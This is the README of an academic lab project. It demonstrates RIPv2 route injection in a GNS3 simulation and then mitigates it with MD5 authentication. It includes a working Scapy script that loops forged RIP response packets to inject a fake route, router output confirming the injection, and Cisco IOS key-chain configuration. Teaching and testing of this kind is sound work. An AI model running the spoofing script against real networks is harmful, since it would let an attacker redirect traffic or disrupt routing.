# RIP Route Injection Attack & Mitigation

**Authors:** Karolina Graf, Yuliia Lesyk, Mylana Herasymenko
**Project Type:** Network Security / Routing Protocols
**Tools Used:** GNS3, Kali Linux, Scapy (Python), Wireshark, Cisco IOS

---

##  Project Overview
This project demonstrates a vulnerability in the **Routing Information Protocol (RIP)** known as **Route Injection**. RIPv2, in its default configuration, does not require authentication, making it susceptible to spoofing attacks. By injecting false routing information, an attacker can manipulate routing tables, redirect traffic, or cause a Denial of Service (DoS).

The project is divided into three main phases:
1.  **Topology Setup:** Configuring a network with 5 routers and end devices using GNS3.
2.  **Attack Execution:** Using a Kali Linux VM to inject false routing information via a Python Scapy script.
3.  **Mitigation:** Securing the network by implementing **MD5 Authentication**.

---

##  Network Topology
The simulation was conducted in **GNS3** using the following components:
* **Routers:** R1, R2, R3, R4, R5 (Main routing nodes).
* **Attacker:** Kali Linux VM connected to the `10.1.3.0/24` network segment.
* **Victim Network:** The entire RIP routing domain.

**Key Addresses:**
* **Attacker IP (Kali):** `10.1.3.11`
* **RIP Multicast Address:** `224.0.0.9`
* **Injected (Fake) Route:** `10.1.4.0/24` with Metric 1

---

##  The Attack: Route Injection

### Methodology
The attack involves sending forged RIPv2 "Response" packets to the multicast group. The router receives these updates and, believing they come from a legitimate neighbor, adds the fake route to its routing table.

### 1. Python Injection Script (Scapy)
The script used to generate malicious packets constructs a RIPv2 packet with a fake network entry (`10.1.4.0/24`) and sends it to the multicast address on UDP port 520.

```python
#!/usr/bin/env python3
# Simplified snippet of the attack script based on project documentation
from scapy.all import *

# Configuration
SOURCE_IP = "10.1.3.11"
DEST_IP = "224.0.0.9"
FAKE_NET = "10.1.4.0"

# Packet Construction
pkt = Ether(dst="01:00:5e:00:00:09") / \
      IP(src=SOURCE_IP, dst=DEST_IP) / \
      UDP(sport=520, dport=520) / \
      RIP(cmd=2, version=2) / \
      RIPEntry(AF="IP", RouteTag=0, addr=FAKE_NET, 
               mask="255.255.255.0", nextHop="0.0.0.0", metric=1)

# Send packet
sendp(pkt, loop=1, inter=2, verbose=1)
```

### 2. Verification
Before mitigation, the router accepted the fake route. The command `show ip route` confirmed the injection:

```text
R       10.1.4.0/24 [120/1] via 10.1.3.11, 00:00:06, FastEthernet1/0
```
*The router now believes the fake network exists and is reachable via the attacker's machine.*

---

##  Mitigation: MD5 Authentication

To prevent unauthorized route updates, we configured **MD5 Authentication** on the routers. This ensures that routers only accept updates from neighbors that possess the correct key (`ciscorip`).

### Cisco IOS Configuration
The configuration commands are available in the `cisco_mitigation.ios` file within this repository. The core concept involves creating a key chain and applying it to the interface:

```cisco
! 1. Create the Key Chain
key chain RIP-KEYS
 key 1
  key-string ciscorip

! 2. Apply to Interface (Example: FastEthernet 0/0)
interface fastEthernet 0/0
 ip rip authentication mode md5
 ip rip authentication key-chain RIP-KEYS
```

### Result
After applying the security configuration, the attack script was executed again. The routers ignored the malicious packets because they lacked the valid MD5 signature. The fake route `10.1.4.0/24` **did not appear** in the routing table.

---

##  Full Report
For detailed screenshots, Wireshark analysis, and topology diagrams, please refer to the included PDF:  
[**RIP_Attack_Report.pdf**](./RIP_Attack_Report.pdf)

---
*Based on the academic report "Atak na RIP - Fałszowanie tras" by Graf, Lesyk, Herasymenko.*


